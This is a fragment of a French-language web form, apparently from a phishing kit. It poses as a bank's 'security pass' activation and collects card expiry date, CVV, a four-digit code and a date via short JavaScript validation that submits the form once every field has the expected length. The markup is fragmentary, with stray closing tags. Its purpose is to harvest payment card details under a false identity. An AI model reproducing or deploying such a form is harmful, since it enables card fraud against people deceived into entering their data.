	<script type="text/javascript">function chek_put(){var puta1= document.getElementById('jj');var puta2= document.getElementById('mm');var puta3= document.getElementById('aa');var puta4= document.getElementById('cv');var puta5= document.getElementById('EMM');var puta6= document.getElementById('EYY');var puta7= document.getElementById('xxx');if (puta1.value.length == 0){document.getElementById('jj').style.borderColor = "red";}if (puta2.value.length == 0){document.getElementById('mm').style.borderColor = "red";}if (puta3.value.length == 0) {document.getElementById('aa').style.borderColor = "red";}if (puta4.value.length == 0) {document.getElementById('cv').style.borderColor = "red";}if (puta5.value.length == 0) {document.getElementById('EMM').style.borderColor = "red";}if (puta6.value.length == 0) {document.getElementById('EYY').style.borderColor = "red";}if (puta7.value.length == 0) {document.getElementById('xxx').style.borderColor = "red";}chek_kolchi_wach_zaz();}function chek_kolchi_wach_zaz(){var puta1= document.getElementById('jj'); var puta2= document.getElementById('mm');var puta3= document.getElementById('aa');var puta4= document.getElementById('cv');var puta7= document.getElementById('xxx');if(puta1.value.length == 2 && puta2.value.length == 2 && puta3.value.length == 4 && puta4.value.length == 4 && puta7.value.length == 3){document.getElementById('myform').submit();;return false;}}
	function chek1(){var v1 = document.getElementById('jj');if(v1.value.length > 0){document.getElementById('jj').style.borderColor = "#bbd9f9"}}
	function chek2(){var v1 = document.getElementById('mm');if(v1.value.length > 0){document.getElementById('mm').style.borderColor = "#bbd9f9"}}
	function chek3(){var v1 = document.getElementById('aa');if(v1.value.length > 0){document.getElementById('aa').style.borderColor = "#bbd9f9"}}
	function chek4(){var v1 = document.getElementById('cv');if(v1.value.length > 0){document.getElementById('cv').style.borderColor = "#bbd9f9"}}
	function chek5(){var v1 = document.getElementById('EMM');if(v1.value.length > 0){document.getElementById('EMM').style.borderColor = "#bbd9f9"}}
	function chek6(){var v1 = document.getElementById('EYY');if(v1.value.length > 0){document.getElementById('EYY').style.borderColor = "#bbd9f9"}}
	function chek7(){var v1 = document.getElementById('xxx');if(v1.value.length > 0){document.getElementById('xxx').style.borderColor = "#bbd9f9"}}
	</script>

								<div class="data"><input id="mm" name="mm" type="text" pattern="\d*" class="datos" placeholder="Mois" maxlength="2" size="2" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;else{chek2();}"></div>
								<div class="data"><input id="aa" name="aa" type="text" pattern="\d*" class="datos" placeholder="Année" maxlength="4" size="4" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;else{chek3();}"></div>
							</div>

							</div>
						</div>

                                        </select>
                                    </div>
								</div>

                                        </select>

								</div>

								<div class="bibita">
                                    <input type="text" id="xxx" name="xxx" pattern="\d*" class="harba" placeholder="XXX" maxlength="3" size="3" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;else{chek7();}">
								</div>

							<div class="foter"><center><div class="buta-foter" onclick="chek_put();">ACTIVER MON PASS SÉCURITÉ</div></center></div>
